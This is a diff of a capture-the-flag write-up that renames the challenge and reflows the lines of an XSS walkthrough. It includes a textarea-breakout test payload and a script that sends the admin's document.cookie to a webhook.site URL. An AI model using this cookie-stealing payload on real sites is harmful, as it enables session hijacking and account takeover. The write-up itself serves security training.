@@ -1,4 +1,4 @@
-# Challenge `Read my lips: No more scripts!` Writeup
+# Challenge `Go on and censor my posts` Writeup
 
 - Vulnerability: 
   - XSS attack
@@ -20,9 +20,9 @@ Start by creating a new post with some random title and content.
 Then, by opening the source code of the page, notice that the content is a textarea and whatever we enter is then
 rendered on the screen after clicking the `Update post` button.
 This means that we can close the textarea tag and inject JavaScript code that when rendered will execute.
-It's possible to test this by injecting `</textarea><script>alert(1)</script>`  and clicking the `Update post` button.
-To steal the admin's cookie, we can re-use the payload from the previous challenge that sends a GET request to a webhook
-site with the `document.cookie` appended to the URL.
+It's possible to test this by injecting `</textarea><script>alert(1)</script>`  and clicking the `Update post` button.  
+To steal the admin's cookie, we can re-use the payload from the previous challenge that sends a GET request   
+to a webhook site with the `document.cookie` appended to the URL.
 Write the following payload in the content textarea:
 `</textarea><script>location='https://webhook.site/your-unique-id/'+document.cookie;</script>`
 and click `Update post and send it for admin review` button.
